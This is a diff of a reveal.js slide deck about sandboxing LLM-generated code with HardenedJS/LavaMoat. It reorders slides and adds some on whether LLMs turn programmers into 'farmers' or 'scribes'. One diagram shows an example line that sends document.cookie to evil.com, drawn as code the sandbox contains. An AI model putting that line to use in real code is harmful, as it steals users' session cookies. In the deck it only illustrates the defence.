@@ -555,15 +555,6 @@ LavaMoat uses HardenedJS to provide security for JavaScript projects of today an
 
           ---
 
-          ### MCP forces LLM to process <br>"in its head"
-
-          - why waste resources? 
-            - we can merge JSON without AI
-          - why risk hallucinating?
-
-        
-          ---
-
           ### thinking slow
 
           ```mermaid
@@ -581,6 +572,17 @@ LavaMoat uses HardenedJS to provide security for JavaScript projects of today an
             BB --> I[Final Output]
 
           ```
+
+          MCP forces LLM to process <br>"in its head"
+
+          ---
+          
+          ### MCP forces LLM to process <br>"in its head"
+
+          - why waste resources? 
+            - we can merge JSON without AI
+          - why risk hallucinating?
+        
           ---
 
           #### LLMs are better at generating code than strict reasoning
@@ -610,7 +612,7 @@ LavaMoat uses HardenedJS to provide security for JavaScript projects of today an
           ```
           ---
 
-          ### no risks
+          ### limiting risks
 
           ```mermaid
           graph LR
@@ -618,7 +620,7 @@ LavaMoat uses HardenedJS to provide security for JavaScript projects of today an
             B --> C
             C --> E{Error}
             subgraph CODE[Orchestration Code Contained]
-              C["🦎\nfetch('evil.com/?c='+document.cookie)\n_"] 
+              C["👿\nfetch('evil.com/?c='+document.cookie)\n_"] 
 
               C --- Pf
               C -.-x Pp
@@ -632,23 +634,49 @@ LavaMoat uses HardenedJS to provide security for JavaScript projects of today an
           ```
 
           ---
-
-          ## Can even run inside a website
-
-          - HardenedJS sandboxed
-          - limited powers
-          - access to UI integration APIs
-
-          ---
           
-          ### Triangular strawberry arrangement
           # 🍓
           # 🍓🍓
+          <br>
+
+          ### Triangular strawberry arrangement
+
+          demo
+
+          ---
+
+          #### On LLMs replacing programmers
+
+          <br>
+          <br>
+
+          ## 👨‍🌾Farmers 
+          ### or 
+          ## 📜Scribes
+          ### ?
+
+          ---
+
+          Slide for people who didn't see this live
+
+          > Farmers  
+          > automation -> centralization -> few expert farmers
+
+          > Scribes  
+          > automation -> decentralization -> everyone's their own scribe
+
+
 
         </textarea>
       </section>
+       <section data-markdown data-background="./ilus/botcont1.png" data-background-size="30%" data-background-position="right bottom">
+        ### Something for the Scribes
+        
+        > Add a button that performs the following bulk action on items in the current view:  
+        > ...
+      </section>
        <section data-markdown data-background="./ilus/botcont2.png">
-        # What if...
+        ## Something for the Farmers
 
       </section>
       <section data-markdown class="animateBot animateMany">
